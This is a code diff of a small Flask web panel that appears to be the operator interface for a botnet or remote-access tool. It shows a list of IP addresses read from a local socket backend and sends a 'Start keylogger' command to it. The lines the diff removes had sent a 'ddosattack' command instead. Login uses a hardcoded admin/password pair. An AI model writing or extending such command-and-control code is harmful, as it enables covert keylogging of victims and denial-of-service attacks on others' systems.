@@ -5,6 +5,7 @@ from flask import Flask, flash, redirect, render_template, request, session, abo
 import os
 import socket
 import json 
+import sys
 
 app = Flask(__name__)
  
@@ -14,30 +15,37 @@ def home():
         return render_template('login.html')
         return redirect(url_for('login'))
     else:
-        return render_template('update.html')
+        return redirect(url_for('main_activity'))
  
 @app.route('/login', methods=['POST'])
-def do_admin_login():
+def login():
     if request.form['password'] == 'password' and request.form['username'] == 'admin':
         session['logged_in'] = True
-        return redirect(url_for('update'))
+        return redirect(url_for('main_activity'))
     else:
         return render_template('login.html')
 
-@app.route('/update', methods=['GET', 'POST'])
-def update():
-    data = []
+@app.route('/main_activity', methods=['GET','POST'])
+def main_activity():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(("127.0.0.1",34567))
-    while True:            
+    sock.connect(("127.0.0.1",8081))
+    while True:
         data_b = sock.recv(4096)
-        data = json.loads(data_b.decode('utf-8'))
-        return render_template('update.html', data = data)
-        print("hello")
-        if request.form['submit'] == 'ddosattack':
-            submit_req = request.form['submit']
-            sock.send(submit_req.encode('utf-8'))
+        data = data_b.decode('utf-8')
+        ip_list = data.split(':')
+        print('Connected', file=sys.stdout)
+        if request.method == 'POST':
+            print(request.form.get('keyloginfo'), file=sys.stdout)
+            if request.form['submit'] == 'Start keylogger':
+                print('hello', file=sys.stdout)
+                req = request.form.get('keyloginfo')
+                print(req, file=sys.stdout)
+                sock.send(req.encode('utf-8'))
+            return render_template('main_activity.html', data = ip_list)
         
+        if request.method == 'GET':
+            return render_template('main_activity.html', data = ip_list)
+
 if __name__ == "__main__":
     app.secret_key = os.urandom(12)
     app.debug=True
